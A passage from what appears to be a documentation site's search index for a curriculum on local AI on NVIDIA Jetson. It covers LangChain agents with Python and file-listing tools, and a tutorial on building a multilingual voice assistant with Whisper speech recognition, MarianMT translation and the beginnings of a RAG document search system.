n_gpu_layers=80)\ntools = [PythonREPLTool()]\nagent = initialize_agent(tools, llm, agent=AgentType.ZERO_SHOT_REACT_DESCRIPTION, verbose=True)\nagent.run(\"What is 12 squared minus 3?\")\n</code></pre>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#ollama-backend-openai-compatible-api","title":"\u2705 Ollama Backend (OpenAI-compatible API)","text":"<pre><code>from langchain.llms import OpenAI\nfrom langchain.agents import initialize_agent, AgentType\nfrom langchain.tools import PythonREPLTool\n\nollama_llm = OpenAI(base_url=\"http://localhost:11434/v1\", api_key=\"ollama\")\ntools = [PythonREPLTool()]\nagent = initialize_agent(tools, ollama_llm, agent=AgentType.ZERO_SHOT_REACT_DESCRIPTION, verbose=True)\nagent.run(\"Solve 2^6 and explain.\")\n</code></pre>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#bonus-add-filesystem-tool","title":"\ud83e\uddea Bonus: Add Filesystem Tool","text":"<pre><code>from langchain.tools import Tool\nimport os\n\ndef list_files():\n    return \"\\n\".join(os.listdir(\"./\"))\n\nfs_tool = Tool(name=\"List Files\", func=list_files, description=\"List files in current directory\")\ntools.append(fs_tool)\n</code></pre>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#lab-deliverables","title":"\ud83d\udccb Lab Deliverables","text":"<ul> <li>Implement local agent using llama.cpp and/or Ollama</li> <li>Add at least 2 tools (Python + custom tool)</li> <li>Demonstrate tool use, function call-like behavior, and multi-turn reasoning</li> </ul>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#summary","title":"\ud83e\udde0 Summary","text":"<ul> <li>Agents = LLM + memory + tools</li> <li>LangChain agents support both llama-cpp-python and Ollama with GGUF models</li> <li>Use structured tool calling and MCP to improve modularity and performance</li> <li>Jetson Orin Nano can run lightweight agents entirely offline</li> </ul> <p>\u2192 Next: Final Project: Hackathon &amp; Challenges</p>"},{"location":"curriculum/my_10b_voice_assistant_jetson/","title":"\ud83d\udde3\ufe0f Advanced Local Voice Assistant with Jetson + LLM","text":"<p>NVIDIA Jetson Orin Nano can be used to create a sophisticated local voice assistant that:</p> <ul> <li>Real-time multi-language voice interaction with automatic language detection</li> <li>Live translation between 100+ languages with voice output</li> <li>RAG-powered document search for local knowledge base queries</li> <li>Command execution and Python code running capabilities</li> <li>Online search integration with web content summarization</li> <li>Multimodal interaction combining voice, vision, and text</li> <li>Privacy-first operation with all processing on-device</li> </ul> <p>This tutorial shows how to build a comprehensive local AI assistant using Whisper, LLMs, advanced TTS, RAG systems, and tool integration\u2014all optimized for Jetson edge deployment.</p>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#advanced-voice-assistant-architecture","title":"\ud83c\udfd7\ufe0f Advanced Voice Assistant Architecture","text":""},{"location":"curriculum/my_10b_voice_assistant_jetson/#system-overview","title":"System Overview","text":"<p>Our advanced voice assistant uses a modular architecture that combines multiple AI components:</p> <pre><code>graph TB\n    A[\ud83c\udfa4 Audio Input] --&gt; B[Voice Activity Detection]\n    B --&gt; C[Speech-to-Text&lt;br/&gt;Whisper]\n    C --&gt; D[Language Detection]\n    D --&gt; E[Intent Classification]\n\n    E --&gt; F{Intent Type}\n    F --&gt;|Conversation| G[LLM Processing]\n    F --&gt;|Translation| H[Translation Engine]\n    F --&gt;|Search| I[RAG System]\n    F --&gt;|Command| J[Code Executor]\n    F --&gt;|Web| K[Web Search]\n\n    G --&gt; L[Response Generation]\n    H --&gt; M[Translation Output]\n    I --&gt; N[Document Results]\n    J --&gt; O[Command Results]\n    K --&gt; P[Web Results]\n\n    L --&gt; Q[Text-to-Speech]\n    M --&gt; Q\n    N --&gt; Q\n    O --&gt; Q\n    P --&gt; Q\n\n    Q --&gt; R[\ud83d\udd0a Audio Output]\n\n    S[(Memory System)] --&gt; G\n    G --&gt; S\n    T[(Vector DB)] --&gt; I\n    U[(Document Store)] --&gt; I\n    V[Web APIs] --&gt; K\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#core-components","title":"Core Components","text":""},{"location":"curriculum/my_10b_voice_assistant_jetson/#audio-processing-pipeline","title":"\ud83c\udf99\ufe0f Audio Processing Pipeline","text":"<ul> <li>Voice Activity Detection (VAD): Detects when user is speaking</li> <li>Noise Cancellation: Removes background noise for better recognition</li> <li>Audio Preprocessing: Normalizes audio for optimal STT performance</li> <li>Real-time Streaming: Processes audio in chunks for low latency</li> </ul>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#ai-processing-engine","title":"\ud83e\udde0 AI Processing Engine","text":"<ul> <li>Speech-to-Text: Whisper model optimized for Jetson</li> <li>Language Detection: Automatic identification of spoken language</li> <li>Intent Classification: Determines user's intent (chat, translate, search, etc.)</li> <li>LLM Processing: Local language model for conversation and reasoning</li> <li>Response Generation: Contextual and personalized responses</li> </ul>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#tool-integration-system","title":"\ud83d\udd27 Tool Integration System","text":"<ul> <li>RAG Engine: Vector search through local documents</li> <li>Translation Engine: Multi-language translation with context</li> <li>Code Executor: Safe Python code execution environment</li> <li>Web Search: Online information retrieval and summarization</li> <li>Command Runner: System command execution with safety checks</li> </ul>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#memory-storage","title":"\ud83d\udcbe Memory &amp; Storage","text":"<ul> <li>Conversation Memory: Short and long-term conversation context</li> <li>User Preferences: Personalized settings and behavior</li> <li>Document Store: Local knowledge base with metadata</li> <li>Vector Database: Semantic search index for documents</li> <li>Cache System: Optimized caching for repeated queries</li> </ul>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#voice-assistant-capabilities","title":"\ud83c\udfaf Voice Assistant Capabilities","text":""},{"location":"curriculum/my_10b_voice_assistant_jetson/#core-voice-features","title":"\ud83d\udde3\ufe0f Core Voice Features","text":"<ul> <li>Real-time speech-to-text in 99+ languages</li> <li>Natural language understanding and conversation</li> <li>High-quality text-to-speech with voice cloning</li> <li>Automatic language detection and switching</li> <li>Voice activity detection and noise cancellation</li> </ul>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#translation-multilingual","title":"\ud83c\udf0d Translation &amp; Multilingual","text":"<ul> <li>Live conversation translation between any languages</li> <li>Document translation with context preservation</li> <li>Cultural context and idiom explanation</li> <li>Pronunciation guidance and language learning</li> </ul>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#knowledge-search","title":"\ud83d\udcda Knowledge &amp; Search","text":"<ul> <li>RAG-based search through local documents (PDFs, texts, etc.)</li> <li>Web search with intelligent summarization</li> <li>Code execution and system command running</li> <li>Real-time information retrieval and fact-checking</li> </ul>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#ai-agent-capabilities","title":"\ud83e\udd16 AI Agent Capabilities","text":"<ul> <li>Task planning and multi-step execution</li> <li>Tool usage and API integration</li> <li>Memory and conversation context</li> <li>Personalized responses based on user preferences</li> </ul>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#tools-models-used","title":"\ud83d\udce6 Tools &amp; Models Used","text":"Task Tool / Model Speech-to-Text Whisper (tiny.en, base) LLM Inference llama.cpp, Ollama Translation M2M100, NLLB (fairseq) Text-to-Speech Coqui TTS, eSpeak Visual Input OpenCV + YOLO or OWL-ViT"},{"location":"curriculum/my_10b_voice_assistant_jetson/#installation-on-jetson","title":"\u2699\ufe0f Installation on Jetson","text":"<pre><code># Whisper ASR\npip install openai-whisper\n\n# LLM Inference (choose one)\npip install llama-cpp-python\n# or Ollama: https://ollama.com/download\n\n# TTS\npip install TTS  # Coqui TTS\nsudo apt install espeak ffmpeg\n\n# Vision support\npip install opencv-python\npip install ultralytics  # for YOLOv8\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#advanced-audio-processing-multi-language-stt","title":"\ud83c\udfa4 Advanced Audio Processing &amp; Multi-Language STT","text":""},{"location":"curriculum/my_10b_voice_assistant_jetson/#enhanced-audio-dependencies","title":"Enhanced Audio Dependencies","text":"<pre><code># Core audio processing\npip install openai-whisper faster-whisper\npip install pyaudio soundfile librosa\npip install webrtcvad noisereduce\npip install langdetect polyglot\n\n# For advanced audio processing\npip install torch torchaudio\npip install transformers datasets\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#advanced-audio-processing-pipeline","title":"Advanced Audio Processing Pipeline","text":"<pre><code>import whisper\nimport pyaudio\nimport wave\nimport tempfile\nimport os\nimport numpy as np\nimport librosa\nimport noisereduce as nr\nimport webrtcvad\nfrom typing import List, Tuple, Optional\nimport threading\nimport queue\nimport time\nfrom langdetect import detect\nimport torch\n\nclass AdvancedAudioProcessor:\n    \"\"\"Advanced audio processing with VAD, noise reduction, and optimization\"\"\"\n\n    def __init__(self, \n                 model_size: str = \"base\",\n                 sample_rate: int = 16000,\n                 chunk_duration: float = 0.5,\n                 vad_aggressiveness: int = 2):\n\n        # Initialize Whisper model with optimization\n        self.device = \"cuda\" if torch.cuda.is_available() else \"cpu\"\n        self.model = whisper.load_model(model_size, device=self.device)\n\n        # Audio parameters\n        self.sample_rate = sample_rate\n        self.chunk_duration = chunk_duration\n        self.chunk_size = int(sample_rate * chunk_duration)\n\n        # Voice Activity Detection\n        self.vad = webrtcvad.Vad(vad_aggressiveness)\n\n        # Audio streaming\n        self.audio = pyaudio.PyAudio()\n        self.is_listening = False\n        self.audio_queue = queue.Queue()\n\n        # Language detection cache\n        self.detected_language = None\n        self.language_confidence = 0.0\n\n        print(f\"\ud83c\udf99\ufe0f Audio processor initialized on {self.device}\")\n\n    def preprocess_audio(self, audio_data: np.ndarray) -&gt; np.ndarray:\n        \"\"\"Advanced audio preprocessing with noise reduction\"\"\"\n        # Normalize audio\n        audio_data = audio_data.astype(np.float32)\n        audio_data = audio_data / np.max(np.abs(audio_data))\n\n        # Noise reduction\n        audio_data = nr.reduce_noise(y=audio_data, sr=self.sample_rate)\n\n        # Apply high-pass filter to remove low-frequency noise\n        audio_data = librosa.effects.preemphasis(audio_data)\n\n        return audio_data\n\n    def detect_voice_activity(self, audio_chunk: bytes) -&gt; bool:\n        \"\"\"Detect if audio chunk contains speech\"\"\"\n        try:\n            # VAD requires specific sample rates\n            if self.sample_rate in [8000, 16000, 32000, 48000]:\n                frame_duration = int(len(audio_chunk) / (self.sample_rate * 2) * 1000)\n                if frame_duration in [10, 20, 30]:\n                    return self.vad.is_speech(audio_chunk, self.sample_rate)\n            return True  # Fallback to assuming speech\n        except:\n            return True\n\n    def detect_language(self, text: str) -&gt; Tuple[str, float]:\n        \"\"\"Detect language of transcribed text\"\"\"\n        try:\n            if len(text.strip()) &lt; 10:\n                return self.detected_language or \"en\", 0.5\n\n            detected_lang = detect(text)\n            confidence = 0.8  # Simplified confidence\n\n            # Update cached language if confidence is high\n            if confidence &gt; 0.7:\n                self.detected_language = detected_lang\n                self.language_confidence = confidence\n\n            return detected_lang, confidence\n        except:\n            return \"en\", 0.5\n\n    def stream_audio(self, duration: Optional[float] = None):\n        \"\"\"Stream audio from microphone with real-time processing\"\"\"\n        stream = self.audio.open(\n            format=pyaudio.paInt16,\n            channels=1,\n            rate=self.sample_rate,\n            input=True,\n            frames_per_buffer=self.chunk_size,\n            stream_callback=self._audio_callback\n        )\n\n        self.is_listening = True\n        stream.start_stream()\n\n        print(\"\ud83c\udfa4 Listening... (Press Ctrl+C to stop)\")\n\n        try:\n            if duration:\n                time.sleep(duration)\n            else:\n                while self.is_listening:\n                    time.sleep(0.1)\n        except KeyboardInterrupt:\n            print(\"\\n\ud83d\uded1 Stopping audio stream...\")\n        finally:\n            self.is_listening = False\n            stream.stop_stream()\n            stream.close()\n\n    def _audio_callback(self, in_data, frame_count, time_info, status):\n        \"\"\"Callback for real-time audio processing\"\"\"\n        if self.detect_voice_activity(in_data):\n            self.audio_queue.put(in_data)\n        return (None, pyaudio.paContinue)\n\n    def get_audio_chunks(self, min_chunks: int = 10) -&gt; List[bytes]:\n        \"\"\"Collect audio chunks from queue\"\"\"\n        chunks = []\n        timeout = time.time() + 5.0  # 5 second timeout\n\n        while len(chunks) &lt; min_chunks and time.time() &lt; timeout:\n            try:\n                chunk = self.audio_queue.get(timeout=0.1)\n                chunks.append(chunk)\n            except queue.Empty:\n                if chunks:  # If we have some chunks, break\n                    break\n                continue\n\n        return chunks\n\n    def transcribe_chunks(self, audio_chunks: List[bytes]) -&gt; dict:\n        \"\"\"Transcribe audio chunks with language detection\"\"\"\n        if not audio_chunks:\n            return {\"text\": \"\", \"language\": \"en\", \"confidence\": 0.0}\n\n        # Combine chunks into single audio array\n        audio_data = np.frombuffer(b''.join(audio_chunks), dtype=np.int16)\n        audio_data = audio_data.astype(np.float32) / 32768.0\n\n        # Preprocess audio\n        audio_data = self.preprocess_audio(audio_data)\n\n        # Transcribe with Whisper\n        with tempfile.NamedTemporaryFile(suffix=\".wav\", delete=False) as temp_file:\n            librosa.output.write_wav(temp_file.name, audio_data, self.sample_rate)\n\n            # Use language hint if available\n            options = {}\n            if self.detected_language:\n                options[\"language\"] = self.detected_language\n\n            result = self.model.transcribe(temp_file.name, **options)\n            os.unlink(temp_file.name)\n\n        # Detect language of transcribed text\n        detected_lang, confidence = self.detect_language(result[\"text\"])\n\n        return {\n            \"text\": result[\"text\"].strip(),\n            \"language\": detected_lang,\n            \"confidence\": confidence,\n            \"whisper_language\": result.get(\"language\", \"en\")\n        }\n\n    def listen_continuously(self, callback_func):\n        \"\"\"Continuous listening with callback for transcribed text\"\"\"\n        def process_audio():\n            while self.is_listening:\n                chunks = self.get_audio_chunks()\n                if chunks:\n                    result = self.transcribe_chunks(chunks)\n                    if result[\"text\"]:\n                        callback_func(result)\n                time.sleep(0.1)\n\n        # Start audio streaming in separate thread\n        audio_thread = threading.Thread(target=self.stream_audio)\n        process_thread = threading.Thread(target=process_audio)\n\n        audio_thread.start()\n        process_thread.start()\n\n        return audio_thread, process_thread\n\n    def __del__(self):\n        self.is_listening = False\n        if hasattr(self, 'audio'):\n            self.audio.terminate()\n\n# Usage example\ndef on_speech_detected(result):\n    print(f\"\ud83d\udde3\ufe0f [{result['language']}] {result['text']}\")\n    print(f\"   Confidence: {result['confidence']:.2f}\")\n\n# Initialize processor\naudio_processor = AdvancedAudioProcessor(model_size=\"base\")\n\n# Start continuous listening\naudio_thread, process_thread = audio_processor.listen_continuously(on_speech_detected)\n\n# Let it run for 30 seconds\ntime.sleep(30)\naudio_processor.is_listening = False\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#jetson-optimized-whisper","title":"Jetson-Optimized Whisper","text":"<pre><code>class JetsonOptimizedWhisper:\n    \"\"\"Whisper optimized specifically for Jetson hardware\"\"\"\n\n    def __init__(self, model_size: str = \"base\"):\n        # Enable Jetson optimizations\n        if torch.cuda.is_available():\n            torch.backends.cudnn.benchmark = True\n            torch.backends.cuda.matmul.allow_tf32 = True\n\n            # Set memory fraction for Jetson\n            torch.cuda.set_per_process_memory_fraction(0.7)\n\n        # Load model with optimizations\n        self.device = \"cuda\" if torch.cuda.is_available() else \"cpu\"\n        self.model = whisper.load_model(model_size, device=self.device)\n\n        # Compile model for faster inference (PyTorch 2.0+)\n        try:\n            self.model = torch.compile(self.model)\n            print(\"\u2705 Model compiled for faster inference\")\n        except:\n            print(\"\u26a0\ufe0f Model compilation not available\")\n\n    def transcribe_optimized(self, audio_path: str, language: str = None) -&gt; dict:\n        \"\"\"Optimized transcription for Jetson\"\"\"\n        options = {\n            \"fp16\": torch.cuda.is_available(),  # Use FP16 on GPU\n            \"language\": language,\n            \"task\": \"transcribe\"\n        }\n\n        with torch.cuda.amp.autocast(enabled=torch.cuda.is_available()):\n            result = self.model.transcribe(audio_path, **options)\n\n        return result\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#advanced-translation-engine","title":"\ud83c\udf0d Advanced Translation Engine","text":""},{"location":"curriculum/my_10b_voice_assistant_jetson/#multi-language-translation-dependencies","title":"Multi-Language Translation Dependencies","text":"<pre><code># Translation libraries\npip install transformers torch\npip install sentencepiece protobuf\npip install googletrans==4.0.0rc1\npip install deep-translator\npip install polyglot pyicu pycld2\n\n# Language detection and processing\npip install langdetect fasttext\npip install spacy\n\n# Download language models\npython -m spacy download en_core_web_sm\npython -m spacy download es_core_news_sm\npython -m spacy download fr_core_news_sm\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#advanced-translation-system","title":"Advanced Translation System","text":"<pre><code>import torch\nfrom transformers import MarianMTModel, MarianTokenizer, pipeline\nfrom deep_translator import GoogleTranslator, MyMemoryTranslator\nfrom typing import Dict, List, Tuple, Optional\nimport spacy\nimport re\nfrom dataclasses import dataclass\nfrom langdetect import detect, detect_langs\nimport threading\nimport time\n\n@dataclass\nclass TranslationResult:\n    \"\"\"Structure for translation results\"\"\"\n    original_text: str\n    translated_text: str\n    source_language: str\n    target_language: str\n    confidence: float\n    cultural_notes: List[str]\n    pronunciation_guide: Optional[str] = None\n\nclass AdvancedTranslationEngine:\n    \"\"\"Advanced translation engine with context awareness and cultural intelligence\"\"\"\n\n    def __init__(self, device: str = \"auto\"):\n        self.device = \"cuda\" if device == \"auto\" and torch.cuda.is_available() else \"cpu\"\n\n        # Initialize translation models\n        self.models = {}\n        self.tokenizers = {}\n\n        # Language pairs for local models\n        self.supported_pairs = [\n            (\"en\", \"es\"), (\"en\", \"fr\"), (\"en\", \"de\"), (\"en\", \"zh\"),\n            (\"es\", \"en\"), (\"fr\", \"en\"), (\"de\", \"en\"), (\"zh\", \"en\")\n        ]\n\n        # Cultural context database\n        self.cultural_contexts = {\n            \"greetings\": {\n                \"en\": [\"hello\", \"hi\", \"hey\", \"good morning\", \"good evening\"],\n                \"es\": [\"hola\", \"buenos d\u00edas\", \"buenas tardes\", \"buenas noches\"],\n                \"fr\": [\"bonjour\", \"bonsoir\", \"salut\"],\n                \"de\": [\"hallo\", \"guten tag\", \"guten morgen\", \"guten abend\"]\n            },\n            \"politeness\": {\n                \"en\": [\"please\", \"thank you\", \"excuse me\", \"sorry\"],\n                \"es\": [\"por favor\", \"gracias\", \"disculpe\", \"lo siento\"],\n                \"fr\": [\"s'il vous pla\u00eet\", \"merci\", \"excusez-moi\", \"d\u00e9sol\u00e9\"],\n                \"de\": [\"bitte\", \"danke\", \"entschuldigung\", \"es tut mir leid\"]\n            }\n        }\n\n        # Initialize spaCy models for context analysis\n        self.nlp_models = {}\n        self._load_nlp_models()\n\n        print(f\"\ud83c\udf0d Translation engine initialized on {self.device}\")\n\n    def _load_nlp_models(self):\n        \"\"\"Load spaCy models for different languages\"\"\"\n        models_to_load = {\n            \"en\": \"en_core_web_sm\",\n            \"es\": \"es_core_news_sm\",\n            \"fr\": \"fr_core_news_sm\"\n        }\n\n        for lang, model_name in models_to_load.items():\n            try:\n                self.nlp_models[lang] = spacy.load(model_name)\n            except OSError:\n                print(f\"\u26a0\ufe0f {model_name} not found for {lang}\")\n\n    def load_translation_model(self, source_lang: str, target_lang: str):\n        \"\"\"Load specific translation model for language pair\"\"\"\n        model_key = f\"{source_lang}-{target_lang}\"\n\n        if model_key in self.models:\n            return\n\n        try:\n            model_name = f\"Helsinki-NLP/opus-mt-{source_lang}-{target_lang}\"\n            tokenizer = MarianTokenizer.from_pretrained(model_name)\n            model = MarianMTModel.from_pretrained(model_name)\n\n            if self.device == \"cuda\":\n                model = model.to(self.device)\n                model = model.half()  # Use FP16 for memory efficiency\n\n            self.tokenizers[model_key] = tokenizer\n            self.models[model_key] = model\n\n            print(f\"\u2705 Loaded model for {source_lang} \u2192 {target_lang}\")\n        except Exception as e:\n            print(f\"\u274c Failed to load model for {source_lang} \u2192 {target_lang}: {e}\")\n\n    def detect_language_advanced(self, text: str) -&gt; Tuple[str, float]:\n        \"\"\"Advanced language detection with confidence scoring\"\"\"\n        try:\n            # Use langdetect for primary detection\n            detections = detect_langs(text)\n            primary_lang = detections[0].lang\n            confidence = detections[0].prob\n\n            # Validate with cultural context\n            cultural_score = self._calculate_cultural_score(text, primary_lang)\n            adjusted_confidence = (confidence + cultural_score) / 2\n\n            return primary_lang, adjusted_confidence\n        except:\n            return \"en\", 0.5\n\n    def _calculate_cultural_score(self, text: str, detected_lang: str) -&gt; float:\n        \"\"\"Calculate cultural context score for language detection\"\"\"\n        text_lower = text.lower()\n        score = 0.0\n        total_checks = 0\n\n        for category, lang_phrases in self.cultural_contexts.items():\n            if detected_lang in lang_phrases:\n                phrases = lang_phrases[detected_lang]\n                for phrase in phrases:\n                    total_checks += 1\n                    if phrase in text_lower:\n                        score += 1.0\n\n        return score / max(total_checks, 1)\n\n    def extract_context(self, text: str, language: str) -&gt; Dict:\n        \"\"\"Extract linguistic and cultural context from text\"\"\"\n        context = {\n            \"entities\": [],\n            \"sentiment\": \"neutral\",\n            \"formality\": \"neutral\",\n            \"cultural_elements\": []\n        }\n\n        if language in self.nlp_models:\n            nlp = self.nlp_models[language]\n            doc = nlp(text)\n\n            # Extract named entities\n            context[\"entities\"] = [(ent.text, ent.label_) for ent in doc.ents]\n\n            # Analyze formality (simplified)\n            formal_indicators = [\"please\", \"would\", \"could\", \"may i\", \"excuse me\"]\n            informal_indicators = [\"hey\", \"yeah\", \"gonna\", \"wanna\", \"sup\"]\n\n            text_lower = text.lower()\n            formal_count = sum(1 for indicator in formal_indicators if indicator in text_lower)\n            informal_count = sum(1 for indicator in informal_indicators if indicator in text_lower)\n\n            if formal_count &gt; informal_count:\n                context[\"formality\"] = \"formal\"\n            elif informal_count &gt; formal_count:\n                context[\"formality\"] = \"informal\"\n\n        return context\n\n    def translate_with_context(self, \n                             text: str, \n                             target_language: str,\n                             source_language: str = None,\n                             preserve_formality: bool = True) -&gt; TranslationResult:\n        \"\"\"Translate text with context preservation\"\"\"\n\n        # Detect source language if not provided\n        if not source_language:\n            source_language, confidence = self.detect_language_advanced(text)\n        else:\n            confidence = 0.9\n\n        # Extract context from source text\n        source_context = self.extract_context(text, source_language)\n\n        # Perform translation\n        translated_text = self._translate_text(text, source_language, target_language)\n\n        # Generate cultural notes\n        cultural_notes = self._generate_cultural_notes(text, source_language, target_language)\n\n        # Generate pronunciation guide if needed\n        pronunciation = self._generate_pronunciation_guide(translated_text, target_language)\n\n        return TranslationResult(\n            original_text=text,\n            translated_text=translated_text,\n            source_language=source_language,\n            target_language=target_language,\n            confidence=confidence,\n            cultural_notes=cultural_notes,\n            pronunciation_guide=pronunciation\n        )\n\n    def _translate_text(self, text: str, source_lang: str, target_lang: str) -&gt; str:\n        \"\"\"Core translation function with fallback strategies\"\"\"\n        model_key = f\"{source_lang}-{target_lang}\"\n\n        # Try local model first\n        if (source_lang, target_lang) in self.supported_pairs:\n            self.load_translation_model(source_lang, target_lang)\n\n            if model_key in self.models:\n                try:\n                    tokenizer = self.tokenizers[model_key]\n                    model = self.models[model_key]\n\n                    inputs = tokenizer(text, return_tensors=\"pt\", padding=True)\n                    if self.device == \"cuda\":\n                        inputs = {k: v.to(self.device) for k, v in inputs.items()}\n\n                    with torch.no_grad():\n                        outputs = model.generate(**inputs, max_length=512)\n\n                    translated = tokenizer.decode(outputs[0], skip_special_tokens=True)\n                    return translated\n                except Exception as e:\n                    print(f\"\u26a0\ufe0f Local translation failed: {e}\")\n\n        # Fallback to online translation\n        try:\n            translator = GoogleTranslator(source=source_lang, target=target_lang)\n            return translator.translate(text)\n        except:\n            try:\n                translator = MyMemoryTranslator(source=source_lang, target=target_lang)\n                return translator.translate(text)\n            except:\n                return f\"[Translation failed: {text}]\"\n\n    def _generate_cultural_notes(self, text: str, source_lang: str, target_lang: str) -&gt; List[str]:\n        \"\"\"Generate cultural context notes for translation\"\"\"\n        notes = []\n        text_lower = text.lower()\n\n        # Check for cultural elements\n        cultural_patterns = {\n            \"greetings\": \"This is a greeting that may have different cultural implications\",\n            \"politeness\": \"Politeness levels vary between cultures\",\n            \"time_references\": \"Time expressions may need cultural context\",\n            \"food_terms\": \"Food terms often don't have direct translations\"\n        }\n\n        for category, lang_phrases in self.cultural_contexts.items():\n            if source_lang in lang_phrases:\n                for phrase in lang_phrases[source_lang]:\n                    if phrase in text_lower:\n                        if category in cultural_patterns:\n                            notes.append(cultural_patterns[category])\n                        break\n\n        return notes\n\n    def _generate_pronunciation_guide(self, text: str, language: str) -&gt; Optional[str]:\n        \"\"\"Generate basic pronunciation guide\"\"\"\n        # Simplified pronunciation mapping\n        pronunciation_guides = {\n            \"es\": {\n                \"\u00f1\": \"ny\", \"rr\": \"rolled r\", \"j\": \"h\", \"ll\": \"y\"\n            },\n            \"fr\": {\n                \"\u00e7\": \"s\", \"\u00e9\": \"ay\", \"\u00e8\": \"eh\", \"\u00ea\": \"eh\"\n            },\n            \"de\": {\n                \"\u00fc\": \"ue\", \"\u00f6\": \"oe\", \"\u00e4\": \"ae\", \"\u00df\": \"ss\"\n            }\n        }\n\n        if language in pronunciation_guides:\n            guide = text\n            for char, replacement in pronunciation_guides[language].items():\n                guide = guide.replace(char, f\"[{replacement}]\")\n            return guide if guide != text else None\n\n        return None\n\n    def translate_conversation(self, \n                             conversation: List[str], \n                             target_language: str,\n                             source_language: str = None) -&gt; List[TranslationResult]:\n        \"\"\"Translate entire conversation with context continuity\"\"\"\n        results = []\n        detected_language = source_language\n\n        for utterance in conversation:\n            if not detected_language:\n                detected_language, _ = self.detect_language_advanced(utterance)\n\n            result = self.translate_with_context(\n                utterance, \n                target_language, \n                detected_language\n            )\n            results.append(result)\n\n        return results\n\n# Real-time Translation Assistant\nclass RealTimeTranslator:\n    \"\"\"Real-time translation for voice conversations\"\"\"\n\n    def __init__(self, audio_processor, translation_engine):\n        self.audio_processor = audio_processor\n        self.translation_engine = translation_engine\n        self.conversation_history = []\n        self.target_language = \"en\"\n        self.is_translating = False\n\n    def set_target_language(self, language: str):\n        \"\"\"Set target language for translation\"\"\"\n        self.target_language = language\n        print(f\"\ud83c\udf0d Target language set to: {language}\")\n\n    def start_real_time_translation(self):\n        \"\"\"Start real-time translation mode\"\"\"\n        self.is_translating = True\n\n        def on_speech_translated(speech_result):\n            if not self.is_translating:\n                return\n\n            # Translate the speech\n            translation_result = self.translation_engine.translate_with_context(\n                speech_result[\"text\"],\n                self.target_language,\n                speech_result[\"language\"]\n            )\n\n            # Display results\n            print(f\"\\n\ud83d\udde3\ufe0f [{speech_result['language']}]: {translation_result.original_text}\")\n            print(f\"\ud83c\udf0d [{self.target_language}]: {translation_result.translated_text}\")\n\n            if translation_result.cultural_notes:\n                print(f\"\ud83d\udcdd Cultural notes: {', '.join(translation_result.cultural_notes)}\")\n\n            if translation_result.pronunciation_guide:\n                print(f\"\ud83d\udd24 Pronunciation: {translation_result.pronunciation_guide}\")\n\n            # Store in conversation history\n            self.conversation_history.append(translation_result)\n\n        # Start continuous listening with translation\n        return self.audio_processor.listen_continuously(on_speech_translated)\n\n    def stop_translation(self):\n        \"\"\"Stop real-time translation\"\"\"\n        self.is_translating = False\n        self.audio_processor.is_listening = False\n\n    def get_conversation_summary(self) -&gt; str:\n        \"\"\"Get summary of translated conversation\"\"\"\n        if not self.conversation_history:\n            return \"No conversation to summarize.\"\n\n        summary = \"\ud83d\udccb Conversation Summary:\\n\"\n        for i, result in enumerate(self.conversation_history[-10:], 1):  # Last 10 exchanges\n            summary += f\"{i}. [{result.source_language}] {result.original_text}\\n\"\n            summary += f\"   [{result.target_language}] {result.translated_text}\\n\\n\"\n\n        return summary\n\n# Usage example\ntranslation_engine = AdvancedTranslationEngine()\naudio_processor = AdvancedAudioProcessor()\nreal_time_translator = RealTimeTranslator(audio_processor, translation_engine)\n\n# Set target language and start translation\nreal_time_translator.set_target_language(\"es\")  # Translate to Spanish\naudio_thread, process_thread = real_time_translator.start_real_time_translation()\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#rag-powered-document-search-system","title":"\ud83d\udcda RAG-Powered Document Search System","text":""},{"location":"curriculum/my_10b_voice_assistant_jetson/#rag-dependencies-for-voice-assistant","title":"RAG Dependencies for Voice Assistant","text":"<pre><code># Document processing and RAG\npip install langchain langchain-community\npip install faiss-cpu faiss-gpu  # Use faiss-gpu if CUDA available\npip install sentence-transformers\npip install pypdf2 python-docx\npip install chromadb\n\n# Advanced document processing\npip install unstructured[local-inference]\npip install pytesseract pillow\npip install python-magic-bin  # For file type detection\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#advanced-document-processing-for-voice-queries","title":"Advanced Document Processing for Voice Queries","text":"<pre><code>import os\nimport json\nfrom typing import List, Dict, Optional, Tuple\nfrom pathlib import Path\nimport logging\nfrom dataclasses import dataclass\n\n# LangChain imports\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain.embeddings import HuggingFaceEmbeddings\nfrom langchain.vectorstores import FAISS, Chroma\nfrom langchain.document_loaders import (\n    PyPDFLoader, TextLoader, UnstructuredWordDocumentLoader,\n    CSVLoader, JSONLoader\n)\nfrom langchain.schema import Document\n\n# Additional imports\nimport torch\nfrom sentence_transformers import SentenceTransformer\nimport numpy as np\nfrom datetime import datetime\nimport hashlib\n\n@dataclass\nclass DocumentSearchResult:\n    \"\"\"Structure for document search results\"\"\"\n    content: str\n    source: str\n    score: float\n    metadata: Dict\n    summary: Optional[str] = None\n\nclass VoiceRAGProcessor:\n    \"\"\"RAG system optimized for voice queries and Jetson hardware\"\"\"\n\n    def __init__(self, \n                 documents_path: str = \"./documents\",\n                 vector_store_path: str = \"./vector_store\",\n                 embedding_model: str = \"all-MiniLM-L6-v2\",\n                 chunk_size: int = 500,\n                 chunk_overlap: int = 50):\n\n        self.documents_path = Path(documents_path)\n        self.vector_store_path = Path(vector_store_path)\n        self.chunk_size = chunk_size\n        self.chunk_overlap = chunk_overlap\n\n        # Initialize embeddings with Jetson optimization\n        self.device = \"cuda\" if torch.cuda.is_available() else 